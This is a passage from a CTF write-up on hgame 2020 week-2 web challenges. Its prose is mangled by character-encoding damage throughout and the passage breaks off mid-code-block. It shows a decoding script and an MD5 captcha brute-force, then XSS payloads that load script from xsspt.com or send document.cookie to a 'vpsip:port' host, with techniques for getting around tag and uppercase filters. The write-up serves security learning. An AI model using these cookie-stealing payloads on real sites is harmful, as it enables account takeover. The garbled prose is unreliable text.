å¼‚äºå¤§æµ·æé’ˆï¼Œå°±æ²¡æœ‰æ„ä¹‰äº†ã€‚)</p><p>é¦–å…ˆè¿™é‡Œå…ˆæƒè¡¡ä¸‹è„šæœ¬çš„ä¹¦å†™æ–¹å¼ã€‚å¼€å§‹æˆ‘æ˜¯æƒ³ç”¨phpè„šæœ¬çš„ã€‚ä½†æ˜¯æˆ‘ä¸ä¼šphpä¸­ä¸pythoné‡Œrequestsåº“æœ‰ç›¸åŒåŠŸèƒ½çš„çŸ¥è¯†ï¼Œé‚£å°±åªèƒ½ç”¨pythonè„šæœ¬äº†ã€‚ä½†éšä¹‹è€Œæ¥çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦æŠŠåŠ å¯†çš„å‡½æ•°æ”¹ä¸€æ”¹ï¼Œè€Œä¸”pythoné‡Œè¿˜æ²¡æ‰¾åˆ°rot-13decodeçš„åº“â€¦â€¦ï¼ˆæˆ‘å°±æ˜¯å› ä¸ºæ‰¾äº†ä¸ªé”™çš„rot-13è§£ç è„šæœ¬å¯¼è‡´ç™½èŠ±äº†å¿«ä¸€ä¸ªå°æ—¶ï¼‰</p><p>æ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œè¯·æ±‚ä¸¤ä¸ªé¡µé¢ï¼Œåˆ†åˆ«ç”¨æ­£åˆ™æ‹¿åˆ°å›æ˜¾å†…å®¹ï¼Œä»¥åŠmycodeé‡Œ10ä¸ªåŠ å¯†å‡½æ•°ç»„æˆçš„å­—ç¬¦ä¸²ã€‚æˆ‘å†å¦å†™ä¸€ä¸ªå‡½æ•°åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ¯åŒ¹é…åˆ°ä¸€ä¸ªå‡½æ•°åå­—ç¬¦ä¸²æ‰§è¡Œå¯¹åº”çš„è§£å¯†å‡½æ•°ã€‚ï¼ˆç¨å¾®è§£é‡Šä¸‹ï¼Œå› ä¸ºè‡ªå·±ä¸€å¼€å§‹å¼„åäº†ã€‚æˆ‘ä»¬è§£å¯†æ˜¯è¦å¯¹å›æ˜¾å†…å®¹ä»å¤–å‘é‡Œè§£ï¼Œæ•…è°ƒç”¨çš„å‡½æ•°é¡ºåºä¸æˆ‘ä»¬ä»mycodeé‡Œè·å¾—åŠ å¯†å‡½æ•°å­—ç¬¦ä¸²ä¸­å‡½æ•°çš„é¡ºåºæ˜¯ä¸€è‡´çš„ã€‚<br>æ¯”å¦‚åŠ å¯†æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$å¯†ç &#x3D;base64_encode(str_rot13(strrev($åŸç )))</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(strrev(str_rot13(base64_decode($å¯†ç ))))</span><br></pre></td></tr></table></figure><p>æ¥å¾—åˆ°åŸç ã€‚<br>ä½†æˆ‘å°è£…å¥½çš„åŒ¹é…å‡½æ•°çš„è°ƒç”¨é¡ºåºä»æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_decode , str_rot13(), strrev()</span><br></pre></td></tr></table></figure><p>è¢«è‡ªå·±ä¸€å¼€å§‹çš„phpè„šæœ¬çš„å›ºåŒ–å°è±¡å½±å“ï¼Œå¼„åäº†é¡ºåºå¯¼è‡´è€æ˜¯æŠ¥é”™ã€‚ä¸å¤ªåº”è¯¥ã€‚è¯ä¸å¤šè¯´ï¼Œè´´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_rot13</span><span class="params">(s, OffSet=<span class="number">13</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span><span class="params">(ch)</span>:</span></span><br><span class="line">        f = <span class="keyword">lambda</span> x: chr((ord(ch) - x + OffSet) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strrev</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(str)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str)):</span><br><span class="line">        res+= chr(ord(str[i]) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec</span><span class="params">(string,token)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'encrypt'</span>:</span><br><span class="line">        <span class="keyword">return</span> decrypt(token)</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'str_rot13'</span>:</span><br><span class="line">        <span class="keyword">return</span> str_rot13(token)</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'base64_encode'</span>:</span><br><span class="line">        f=str(base64.b64decode(token),<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'strrev'</span>:</span><br><span class="line">        <span class="keyword">return</span> strrev(token)</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://76c59cdfab.php.hgame.n3ko.co'</span></span><br><span class="line">url1=<span class="string">'http://76c59cdfab.php.hgame.n3ko.co/mycode'</span></span><br><span class="line"></span><br><span class="line">res=requests.get(url)</span><br><span class="line">res1=requests.get(url1)</span><br><span class="line">key=re.findall(<span class="string">r'(.*)&lt;br&gt;'</span>,res.text)[<span class="number">2</span>]</span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line">key1=re.findall(<span class="string">r'echo\((.*)\$'</span>,res1.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(key1)</span></span><br><span class="line">key1=key1.replace(<span class="string">'('</span>,<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"><span class="comment">#print(key1)</span></span><br><span class="line">token=key</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    text = re.findall(<span class="string">r'(.*?)&lt;br&gt;'</span>, key1)[i]</span><br><span class="line">    token=exec(text,token)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'token'</span>:token</span><br><span class="line">&#125;</span><br><span class="line">flag=requests.post(url=url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸ºäº†æ–¹ä¾¿ï¼ŒæŠŠå‡ ä¸ªè§£å¯†å‡½æ•°é‡æ–°å°è£…ä¸€ä¸‹ã€‚<code>decrypt()</code>å¾ˆå¥½å†™ï¼Œ<code>str_rot13()</code>ä»ç½‘ä¸Šå«–çš„ã€‚<code>exec()</code>å°±æ˜¯ç”¨äºåŒ¹é…å­—ç¬¦ä¸²å¹¶æ‰§è¡Œçš„å‡½æ•°ï¼Œæ³¨æ„å…¶ä¸­çš„base64è¦è½¬å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ç„¶è§£å‡ºæ¥æ˜¯äºŒè¿›åˆ¶dataï¼›ä¹‹åçš„<code>key</code>ä¸<code>key1</code>åˆ†åˆ«ç”¨äºè·å–è¯·æ±‚çš„å†…å®¹ä¸­æˆ‘ä»¬è¦åˆ©ç”¨çš„å›æ˜¾ä¸å‡½æ•°éƒ¨åˆ†ã€‚è¿™é‡Œéœ€è¦è‡ªå·±è°ƒæ•´ä¸€ä¸‹,æ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2]</span><br></pre></td></tr></table></figure><p>æˆ‘ç”¨reçš„<code>findall()</code>å‡½æ•°ï¼Œç”±äºè¿”å›çš„æ˜¯åˆ—è¡¨æ•…è¦è®°å¾—æ ¹æ®<code>res.text</code>è°ƒæ•´å¯¹åº”çš„ä¸‹æ ‡ã€‚<br>ä¹‹åæˆ‘ä¹Ÿç”¨æ­£åˆ™å‡½æ•°ï¼ŒåŒ¹é…å‡ºå‡½æ•°å­—ç¬¦ä¸²ï¼Œå»æ‰æ‹¬å·éƒ¨åˆ†ï¼Œå¹¶åœ¨ä¹‹åè°ƒç”¨<code>exec()</code>å‡½æ•°æ—¶ï¼Œå†æ¬¡åˆ©ç”¨<code>findall()</code>çš„åŒ¹é…å¾—åˆ°å‡½æ•°åç»„æˆçš„åˆ—è¡¨ï¼Œä¾æ¬¡è°ƒç”¨ã€‚æœ€åè§£å‡ºtokenï¼Œpostè¯·æ±‚æ‹¿åˆ°flagã€‚<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/17.jpg" class="lazyload" data-srcset="17.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>ä»flagä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ç”¨phpè„šæœ¬â€¦â€¦ç„¶è€Œæˆ‘tclè€Œä¸ä¼šï¼Œä¸ç„¶å¯ä»¥çœæ‰ä¸å°‘æ—¶é—´ã€‚</p><h1 id="Cosmosçš„èŠå¤©å®¤"><a href="#Cosmosçš„èŠå¤©å®¤" class="headerlink" title="Cosmosçš„èŠå¤©å®¤"></a>Cosmosçš„èŠå¤©å®¤</h1><p>  èŠ±äº†æœ€é•¿æ—¶é—´çš„ä¸€é“é¢˜â€¦â€¦ä½†æ¯•ç«Ÿæ˜¯å¯¹æˆ‘æ¥è¯´æœ€éš¾çš„ä¸€é“äº†ï¼Œåšçš„éå¸¸è¾›è‹¦ä½†æ˜¯åˆæœ‰è®¸å¤šæ”¶è·ã€‚æ‰€ä»¥å°±ç€é‡ç¬”å¢¨å¤šè®°å½•ä¸‹è¿™é“é¢˜ï¼Œé¡ºä¾¿å½“è‡ªå·±çš„å­¦ä¹ ç¬”è®°å¥½äº†ã€‚</p><p>è¿›å…¥ç•Œé¢<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/8.jpg" class="lazyload" data-srcset="8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ç•Œé¢"></p><p>é¦–å…ˆå½“ç„¶æ˜¯åˆ¤æ–­æ¼æ´ç±»å‹äº†ã€‚<br>ä»é¢˜ç›®åå­—å¯ä»¥çŸ¥é“ï¼Œå¯èƒ½æ˜¯ä¸ªå‰ç«¯æ¼æ´ã€‚ç”±äºç•Œé¢å¼€å§‹å°±æä¾›äº†ä¸€ä¸ª<code>Flag is here</code>çš„buttonã€‚ç‚¹å‡»è¿›å»åå‘ç°æç¤º<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/9.jpg" class="lazyload" data-srcset="9.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="token"><br>è¿™é‡Œç›´æ¥è¯´æ˜æˆ‘ä»¬éœ€è¦adminçš„tokenæ‰èƒ½æ‹¿åˆ°flagã€‚å¥½çš„ï¼Œå‰ç«¯+tokenï¼Œåº”è¯¥ä¸éš¾æƒ³åˆ°éœ€è¦æˆ‘ä»¬é€šè¿‡xssæ‰“åˆ°adminçš„cookieæ¥è·å–tokenäº†ã€‚<br>ç„¶åæ•´ç†ä¸‹æ€è·¯ï¼Œå¤§æ¦‚æ˜¯å¦‚æ­¤:é€šè¿‡messageæäº¤payloadã€‚ç„¶åä¸‹é¢ä¸€ä¸ªéªŒè¯ç codeç”¨è„šæœ¬è·‘å‡ºæ¥ã€‚æ¯æ¬¡ç‚¹å‡»â€™æäº¤â€™æ—¶ï¼Œå°±ä¼šæŠŠä¹‹å‰ä¼ è¿‡çš„æ‰€æœ‰messageéƒ½å‘ç»™botã€‚botè‡ªç„¶æ˜¯å¸¦æœ‰adminæƒé™çš„äº†ï¼Œé‚£ä¹ˆå®ƒè®¿é—®æ—¶è§¦å‘æˆ‘ä»¬çš„payload,æˆ‘ä»¬æ‹¿åˆ°tokenå°±å¯ä»¥è®¿é—®/flagäº†ã€‚</p><p>ä¸‹é¢çš„éªŒè¯æ–¹å¼å¹¶ä¸éš¾ï¼Œåªæ˜¯ä¼šå¼ºè¡Œè€—æ—¶é—´ã€‚é€šå¸¸ç”¨è„šæœ¬è·‘å‡ºæ¥éƒ½æ˜¯7,8ä½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999999999</span>):</span><br><span class="line">     code=hashlib.md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">     print(code[:<span class="number">6</span>])</span><br><span class="line">     <span class="keyword">if</span> code[:<span class="number">6</span>]==<span class="string">'bfa9a6'</span>:</span><br><span class="line">         print(i)</span><br><span class="line">         <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯messageçš„å¤„ç†å°±ä¸ç®€å•äº†ã€‚ç®€å•çš„fuzzåä¼šå‘ç°å­˜åœ¨è¿‡æ»¤ä¸ç‰¹æ®Šå¤„ç†ã€‚è¿™ç‚¹ä¹‹åå†è¯´ã€‚å¥½åœ¨é¢˜ç›®è¯´æ˜äº†ï¼Œç­‰æˆ‘ä»¬æµ‹è¯•æˆåŠŸåå†æäº¤éªŒè¯ç ã€‚è¿™æ ·æ‰€æœ‰å†…å®¹éƒ½èƒ½äº¤åˆ°adminbotæ‰‹ä¸Šï¼Œä¸è‡³äºç‹‚è·‘è„šæœ¬æµªè´¹æ—¶é—´ã€‚</p><p>å…¶å®è‡ªå·±åœ¨è¿™é“é¢˜ä¹‹å‰å¹¶æ²¡æœ‰çœŸæ­£æ„ä¹‰ä¸Šåšè¿‡xssæ‰“cookieç±»å‹çš„é¢˜ç›®ã€‚å¤´ä¸€æ¬¡å¬è¯´æ˜¯åœ¨æ ¡èµ›ä¸Šä¸€é“simple_xssçš„é¢˜ç›®ã€‚é‚£é“é¢˜å°±æ˜¯ç®€å•çš„è¿‡æ»¤ä¸‹ç”¨xssæ‰“cookieï¼ˆå½“æ—¶é¢˜ç›®å‡ºäº†ä¸å°‘bugï¼Œç”šè‡³æºç æ³„éœ²ç›´æ¥æ‹¿flagéƒ½è¡Œâ€¦â€¦ï¼‰ã€‚ä¸è¿‡æˆ‘åªçŸ¥é“æœ€åŸºç¡€çš„xsspayloadï¼Œæ ¹æœ¬ä¸ä¼šåˆ©ç”¨xssæ‰“cookieã€‚äºæ˜¯è‡ªå·±å…ˆé€‰æ‹©ç™¾åº¦+googleï¼Œå¾—çŸ¥éœ€è¦xsså¹³å°ã€‚<br>æˆ‘ç”¨çš„è¿™ä¸ªåœ¨çº¿ç½‘ç«™ï¼š<a href="http://xsspt.com/" target="_blank" rel="noopener">http://xsspt.com/</a><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/10.jpg" class="lazyload" data-srcset="10.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å¹³å°"><br>äºæ˜¯æ˜ç™½ï¼Œå…¶å®å°±æ˜¯åœ¨xsså¹³å°åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼Œæ·»åŠ é»˜è®¤æ¨¡æ¿ä»¥åŠxss.jsæ¨¡æ¿,ä¹‹ååªè¦åœ¨xssæ¼æ´å¤„å°è¯•å¹³å°æä¾›ç»™æˆ‘ä»¬çš„payloadå³å¯ã€‚æ¯”å¦‚ï¼š<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/11.jpg" class="lazyload" data-srcset="11.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="payload"><br>å³å¯æ‰§è¡Œxssæ‰“cookieã€‚ä¸Šé¢é¡¹ç›®å‡ ä¸ªè®°å½•éƒ½æ˜¯æˆ‘åœ¨æœ¬åœ°çš„DVWAä¸Šç”¨xss-reflectedè¿™ä¸ªæ¼æ´çš„lowçº§åˆ«çš„è¾“å…¥æ‰“çš„ã€‚</p><p>åŒæ—¶ä¹Ÿæ³¨æ„åˆ°å‡ ç‚¹ï¼Œä»¥ä¸ŠpayloadåŸºæœ¬ä¸Šæ˜¯è¿™æ ·å‡ ä¸ªå½¢å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;script src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">2.&lt;img src&#x3D;x onerror&#x3D;eval(atob(&#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL21sUkpNbj8nK01hdGgucmFuZG9tKCk&#x3D;&#39;))&gt;</span><br><span class="line"></span><br><span class="line">3.javascript:eval(&#39;window.s&#x3D;document.createElement(&quot;script&quot;);window.s.src&#x3D;&quot;&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&quot;;document.body.appendChild(window.s)&#39;)</span><br></pre></td></tr></table></figure><p>æˆ‘åˆ†ä¹‹ä¸º3ç§ï¼š<br>1.<code>&lt;script&gt;</code>æ ‡ç­¾çš„ç»å…¸payloadã€‚srcå±æ€§æ˜¯å¤–éƒ¨å¼•ç”¨<br>2.<code>&lt;img&gt;</code>æ ‡ç­¾çš„onerrorå±æ€§ï¼Œä¹Ÿæ˜¯ä¸€ç§ç»å…¸payloadã€‚åŒæ—¶ç”¨ä¸Š<code>eval(atob())</code>å¤„ç†base64å­—ç¬¦ä¸²æ¥bypassã€‚è¿˜åŸä¸‹æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn?&#39;+Math.random()</span><br></pre></td></tr></table></figure><p>3.ä»¥åŠç¬¬ä¸‰ç§javascriptä¼ªåè®®ã€‚æœ‰æ•ˆé¿å…äº†å°–æ‹¬å·çš„å­˜åœ¨ã€‚<br>ä¸Šé¢1,2ä¸¤ç§payloadæˆ‘éƒ½ç”¨DVWAæ‰“åˆ°cookieäº†ã€‚ç¬¬ä¸‰ç§ä¸è¡Œã€‚</p><p>å›åˆ°é¢˜ç›®ä¸­æ¥ï¼Œè¿™é“é¢˜ç›®çš„è¿‡æ»¤æ¯”æƒ³è±¡ä¸­ä¸¥æ ¼çš„å¤šã€‚æˆ‘æŠŠåšé¢˜æ—¶çš„FUZZç»“æœè´´ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.scriptå…³é”®å­—è¢«è½¬ä¸º Hi there!</span><br><span class="line">2.è¾“å…¥å†…å®¹è½¬ä¸ºå¤§å†™</span><br><span class="line">3.æ ‡ç­¾æ•´ä½“è¿‡æ»¤&lt;&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç‚¹è¿˜å¥½ï¼Œ<code>script</code>è¿‡æ»¤äº†è¿˜æœ‰è¯¸å¦‚<code>img</code>,<code>svg/onload</code>ç­‰ç­‰payloadã€‚<br>ç¬¬äºŒç‚¹æœ‰ç‚¹éš¾åŠï¼Œå› ä¸ºé€šå¸¸æ ‡ç­¾åŒ…æ‹¬å±æ€§å¤§å†™åä»ç„¶èƒ½æ­£å¸¸å¤„ç†ï¼ˆå¤§å†™ç»•è¿‡æ˜¯ä¸€ç§å¸¸è§çš„ç»•è¿‡scriptçš„æ–¹æ³•ï¼‰ï¼Œä½†æ˜¯è¿å±æ€§çš„å€¼éƒ½å¤§å†™ä¼šä¸¥é‡å½±å“æˆ‘çš„payloadæ­£å¸¸æ‰§è¡Œã€‚æ¯”å¦‚<code>ALERT(1)</code>æ˜¯æ²¡æ³•æ‰§è¡Œçš„ã€‚xsså¹³å°ä¸Šç¬¬äºŒç§payload<code>base64</code>+<code>eval()</code>ä¹Ÿæ˜¯ä¸è¡Œçš„ã€‚å› ä¸ºå¤§å†™åå‡½æ•°ä¸èƒ½æ­£å¸¸æ‰§è¡Œäº†ï¼Œç¼–ç ä¹Ÿé”™è¯¯äº†ã€‚<br>ç¬¬ä¸‰ç‚¹éå¸¸éš¾åŠï¼Œåªè¦æœ‰æ ‡ç­¾å°±ç»™æ»¤æ‰ã€‚æ²¡æœ‰ä»€ä¹ˆåˆ«çš„ç»•è¿‡æ–¹æ³•ã€‚<br>æ‰€ä»¥xsså¹³å°æä¾›çš„payloadå…¨å†›è¦†æ²¡ï¼Œå¿…é¡»æƒ³ç»•è¿‡æ–¹æ³•ã€‚</p><p>è¿™æ—¶æˆ‘æƒ³åˆ°äº†å»å¹´æš‘å‡è‡ªå·±å†™çš„ä¸€ç¯‡æ–‡ç« ã€‚æ˜¯å…³äºxss.meä¸Šçš„xssæŒ‘æˆ˜çš„ã€‚å½“æ—¶åŸºæœ¬ä¸Šä¸€è·¯çœ‹ç€wpåšè¿‡æ¥ï¼Œå¥½å¤šéƒ½æ²¡ä»€ä¹ˆå°è±¡ã€‚ä½†ç°åœ¨å†çœ‹å´å‘ç°äº†æ„å¤–å®è—ï¼š<a href="https://www.jianshu.com/p/18473e2174f3" target="_blank" rel="noopener">https://www.jianshu.com/p/18473e2174f3</a><br>æ¯”å¦‚<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/12.jpg" class="lazyload" data-srcset="12.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="&lt;&gt;çš„ç»•è¿‡"><br>è¿˜æœ‰ï¼š<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/13.jpg" class="lazyload" data-srcset="13.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å¤§å†™çš„ç»•è¿‡"></p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥ä¸é—­åˆæ ‡ç­¾ï¼Œåˆ©ç”¨å®ä½“ç¼–ç å®Œæˆxssã€‚(æ²¡æƒ³åˆ°è¦é è‡ªå·±çš„æ–‡ç« è§£å†³â€¦â€¦å¥½å˜²è®½å•Š)<br>å¥½çš„ï¼Œè§£å†³äº†å°–æ‹¬å·ä¸å¤§å†™çš„é—®é¢˜åå†è§£å†³ä¸€ä¸‹<code>script</code>çš„é—®é¢˜å§ã€‚è¿™é‡Œæˆ‘æ‰¾åˆ°äº†skyå¸ˆå‚…ä¹‹å‰åšçš„xssé¢˜ç›®ä»¥åŠä»–åšå¾€å¹´hgameæ—¶å¯¹xssçš„ç»•è¿‡ã€‚<br><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br><a href="https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/" target="_blank" rel="noopener">https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/</a></p><p>ç¬¬ä¸€é“é¢˜xsséƒ¨åˆ†è¿‡æ»¤äº†è®¸å¤šå…³é”®å­—ï¼Œæ¯”å¦‚<code>script</code>ä»¥åŠ<code>onerror</code>ä½†æ˜¯å¯ä»¥ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"document.location='vpsip:port'"</span>&gt;</span><br></pre></td></tr></table></figure><p>(è¿™é‡ŒåŒæ—¶ä¹Ÿæé†’æˆ‘ï¼Œä¸ä¸€å®šè¦ç”¨xsså¹³å°ï¼Œç”¨vpsä¸Šçš„ncç›‘å¬ä¹Ÿå¯ä»¥ã€‚)<br>åŒæ—¶ç”¨ä¸‹é¢çš„payloadæ‰“cookie:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"document.location='vpsip:port/?'+document.cookie"</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ç”¨ç½‘é¡µipåçš„å‚æ•°å¸¦å‡ºcookieã€‚çœ‹åˆ°åé¢æˆ‘çš„ç»“æœå°±æ˜ç™½äº†ã€‚<br>åŠ ä¸Šå¸ˆå‚…hgameçš„payloadå…¶ä¸­çš„charcodeéƒ¨åˆ†å…¶å®å°±æ˜¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 